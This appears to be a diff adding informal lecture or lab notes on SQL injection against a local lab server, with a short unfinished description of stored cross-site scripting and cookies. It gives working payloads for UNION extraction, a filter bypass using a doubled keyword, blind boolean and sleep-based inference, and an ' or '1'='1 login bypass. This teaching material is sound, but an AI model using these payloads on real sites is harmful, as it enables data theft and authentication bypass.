@@ -1,0 +1,100 @@
+sid=1
+
+
+select *  from students where stid=sid
+
+Table students
+	stid, stname, stemail
+Table courses
+	cid, cname, cchours
+	
+1-Query execution:
+	select *  from students where stid=sid
+	Return row (record) for student 1
+	1, ahmed, ahmed@hotmail.com
+	
+2-Query
+	select  * from courses 
+	Return rows for all courses
+	1, intr to c, 3
+	2, intr to python, 3
+	3, api development using java jersey, 6
+	
+3-To create a query returns oth results (the same number of attributes) union
+	select * from students where stid=1 union select * from courses
+	1, ahmed, ahmed@hotmail.com
+	1, intr to c, 3
+	2, intr to python, 3
+	3, api development using java jersey, 6
+	
+4-Suppose                    
+	Querystring : id
+	in your application: SQL="select * from students where stid=$id" ;
+	query.php?id=1
+	Replace the $id with the value from query string.
+	SQL="select * from students where stid=1"
+	in case no data validation\
+	query.php?id=1 union select * from courses
+	SQL="select * from students where stid=1 union select * from courses"
+	
+	SQL Injection:
+	
+	
+5-http://172.16.61.130/compiler/sql/id2.php?id=1%20union%20Select%20*%20from%20courses
+	Replace any case for select with ""
+	Try:
+	http://172.16.61.130/compiler/sql/id2.php?id=1%20union%20selSelectect%20*%20from%20courses
+	
+	When remove the word select
+	http://172.16.61.130/compiler/sql/id2.php?id=1%20union%20select%20*%20from%20courses
+	
+6-To retrieve datbase name
+	user function database()
+7-To retrieve database version
+	use function version()
+
+http://172.16.61.130/compiler/sql/id.php?id=1 union select database(),version(),1
+		
+		
+8-http://172.16.61.130/compiler/sql/sql2.php?id=1
+	Page  returns    yes, ifi c ourse exist
+			no, if course does not exist
+	Required: Get database name
+	http://172.16.61.130/compiler/sql/sql2.php?id=1 and 1=if(substr(database(),1,1) = 'a' ,1,0)
+	
+	condition
+	substr(database(),1,1)
+	mydb: m
+	substr(database(),3,1)
+	d
+	
+	
+	
+	http://172.16.61.130/compiler/sql/sql2.php?id=1 and 1=if(substr(database(),1,1) = 'a' ,sleep(10),0)
+	
+9-Authentication:
+select * from users where (uid="compiler123" and upass="compiler123")
+	without valid username/password
+	Result true: and is true (username is true and password is true)
+	Result true even if both username / password are false
+	or '1'='1'
+	x or true = true
+	" or "1"="1
+	
+	1-select * from users where uid="$uid"; <=return hash of password
+	2-Generate the hash for upass field
+	3-Compare with if returned hash  with generated hash
+	
+	
+10-
+	Page1 : Users enter data, stores data in database
+	Page2 : Read the data from database, and display it as table o the user browser
+	Attack:
+		in Page1: User enter data with java script
+		Page1: Store the data + javascript and store them in database
+		in Page2: Query database, and formulate the data into table
+		Page2: One of rows, data contains javascript
+		Server sends Page2 html to the end user. Browser renders the page, and display on the brower
+	User : Login to web page, server writes the login information to small file on the browser called cookies
+	With each request to the server, the browser automatically sends its cookies
+	
